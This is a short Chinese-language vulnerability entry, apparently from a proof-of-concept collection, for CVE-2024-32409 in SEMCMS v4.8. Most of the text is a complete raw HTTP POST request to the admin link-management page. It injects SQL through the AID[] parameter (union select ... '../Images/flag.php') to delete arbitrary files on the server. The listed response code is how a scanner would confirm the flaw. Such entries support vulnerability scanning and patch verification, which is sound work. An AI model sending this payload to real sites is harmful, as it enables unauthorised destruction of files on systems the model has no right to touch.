﻿# SEMCMS 任意文件删除漏洞

> 更新时间：2024-04-29

> 漏洞编号：CVE-2024-32409

> 漏洞说明：SEMCMS v.4.8中的一个问题允许远程攻击者通过特制的脚本执行任意代码。
发现当在Class=Deleted
AID[]=2)union select 1,2,3,4,5,6,'../Images/flag.php' #
可删除相对路径下的flag.php



> 漏洞特征：

> 验证脚本：HTTP

```
POST /semcms_php_4.8/916lGe_Admin/SEMCMS_Link.php?Class=Deleted&CF=link&page= HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1

languageID=1&AID%5B%5D=2)union select 1,2,3,4,5,6,'../Images/flag.php'  #
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：SEMCMS 任意文件删除漏洞.poc

